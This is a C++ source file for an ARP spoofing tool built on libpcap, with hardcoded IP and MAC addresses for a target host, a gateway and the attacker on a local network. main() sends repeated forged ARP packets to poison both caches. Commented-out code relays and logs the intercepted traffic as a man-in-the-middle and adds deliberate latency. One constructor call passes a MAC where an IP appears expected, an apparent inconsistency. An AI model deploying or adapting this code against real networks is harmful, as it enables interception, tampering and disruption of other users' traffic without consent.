#include "headers/AdapterQuery.h"
#include "headers/net_structure.h"
#include "headers/ARPSpoofing.h"

#include <iostream>

using std::cin, std::cout, std::endl;

void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);

#define EXPAND_MAC(A, B, C, D, E, F) {0x##A,0x##B,0x##C,0x##D,0x##E,0x##F}
#define EXPAND_IP(A, B, C, D) {A,B,C,D}

u_char target_ip[4] = EXPAND_IP(192, 168, 43, 171);
u_char target_mac[6] = EXPAND_MAC(9c, b6, d0, b9, 1a, 0f);

u_char gateway_ip[4] = EXPAND_IP(192, 168, 43, 1);
u_char gateway_mac[6] = EXPAND_MAC(B0, EB, 57, 6E, C7, 58);

u_char self_ip[4] = EXPAND_IP(192, 168, 43, 215);
u_char self_mac[6] = EXPAND_MAC(58, 91, CF, 98, 7B, FF);

u_char broadcast_ip[4] = EXPAND_IP(0, 0, 0, 0);
u_char broadcast_mac[6] = EXPAND_MAC(FF, FF, FF, FF, FF, FF);

int main() {
    cout << "sizeof(arp_packet): " << sizeof(arp_packet) << endl;
    string dev_name = list_dev_and_choose_dev();
    pcap_t *adapter = open_adapter(dev_name);

    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                target_ip, target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_mac, self_mac,
                                                                 target_ip, target_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);


    char ch;
    while (cin >> ch) {
        if (ch == '1') {
            target_spoofer.start();
            gateway_spoofer.start();
        }
        if (ch == '2') {
            target_spoofer.stop();
            gateway_spoofer.stop();
        }
        if (ch == '4') {
            target_spoofer.stop();
            gateway_spoofer.stop();
            return 0;
        }
    }

//    int choose;
//    scanf("%d",&us);
//
//    if (true) {
//        pthread_t tid;
//        pthread_create(&tid, nullptr, &arp_spoofing, nullptr);
//
//        //start the capture
//        pcap_loop(adapter, 0, packet_handler, NULL);
//
//        pcap_close(adapter);
//        getchar();
//    }
//    else if (choose==2)
//    {
//        arp_recover(nullptr);
//    }

    return 0;
}

/* Callback function invoked by libpcap for every incoming packet */
//void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data) {
//    struct tm ltime;
//    char timestr[16];
//    ethernet_header *eh;
//    ip_header *ih;
//
//    /*
//     * Unused variable
//     */
//    (void) (param);
//
//    eh = (ethernet_header *) pkt_data;
//
//    // Make latency
//    usleep(us);
//
//    if (eh->type == htons(0x0800))    // IPv4 is 0x0800
//    {
//        /* retireve the position of the ip header */
//        ih = (ip_header *) (pkt_data +
//                            sizeof(ethernet_header)); //length of ethernet heade
//        if (!memcmp((void *) &ih->daddr, dst_ip, 4)) {
//            printf("To Target:\t%d%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, dst_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//            pcap_sendpacket(adapter,                                // Adapter
//                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
//                            header->len                             // size
//            );
//
//        } else if (!memcmp((void *) &ih->saddr, dst_ip, 4)) {
//            printf("From Target:\t%d.%d.%d.%d\t -> %d.%d.%d.%d\tlen:%d\n",
//                   ih->saddr.byte1,
//                   ih->saddr.byte2,
//                   ih->saddr.byte3,
//                   ih->saddr.byte4,
//
//                   ih->daddr.byte1,
//                   ih->daddr.byte2,
//                   ih->daddr.byte3,
//                   ih->daddr.byte4,
//
//                   header->len);
//            memcpy(eh->dst_mac, gateway_mac, 6);
//            memcpy(eh->src_mac, src_mac, 6);
//            if (pcap_sendpacket(adapter,                                // Adapter
//                            (const u_char *) pkt_data,   // buffer with the deceive_dst_packet
//                            header->len                             // size
//            ) != 0)
//                fprintf(stderr, "\nError sending the Retrans_packet to : %s\n", pcap_geterr(adapter));
//        }
//    }
//}
//
//
//void *arp_spoofing(void *arg) {
//}

//void *arp_recover(void *arg) {
//    while (true) {
//        // Send down the deceive_dst_packet
//        if (pcap_sendpacket(adapter,                                 // Adapter
//                            (const u_char *) &recover_dst_packet,    // buffer with the deceive_dst_packet
//                            sizeof(recover_dst_packet)               // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        if (pcap_sendpacket(adapter,                                        // Adapter
//                            (const u_char *) &recover_gateway_packet,       // buffer with the deceive_dst_packet
//                            sizeof(recover_gateway_packet)                  // size
//        ) != 0) {
//            fprintf(stderr, "\nError sending the deceive_dst_packet: %s\n", pcap_geterr(adapter));
//            return nullptr;
//        }
//        sleep(1);
//    }
//}

